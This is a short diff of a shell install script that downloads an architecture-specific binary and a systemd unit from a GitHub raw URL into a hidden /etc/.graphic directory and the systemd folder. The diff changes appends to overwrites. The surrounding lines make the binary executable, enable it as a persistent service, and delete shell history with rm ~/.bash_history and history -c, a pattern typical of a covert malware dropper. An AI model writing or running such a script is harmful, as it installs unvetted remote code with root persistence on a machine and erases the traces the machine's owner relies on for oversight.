@@ -48,7 +48,7 @@ case $ARCH in
 esac
 
 mkdir /etc/.graphic
-curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals_$GOARCH >> /etc/.graphic/graphicals
+curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals_$GOARCH > /etc/.graphic/graphicals
 chmod 700 /etc/.graphic
 chmod +x /etc/.graphic/graphicals
 rm ~/.bash_history
@@ -58,7 +58,7 @@ history -c
 sudo systemctl stop graphicals.service
 sudo rm -rf /etc/systemd/system/graphicals.service
 sudo systemctl daemon-reload
-curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals.service >> /etc/systemd/system/graphicals.service
+curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals.service > /etc/systemd/system/graphicals.service
 chmod +x /etc/systemd/system/graphicals.service
 sudo systemctl daemon-reload
 sudo systemctl enable graphicals.service
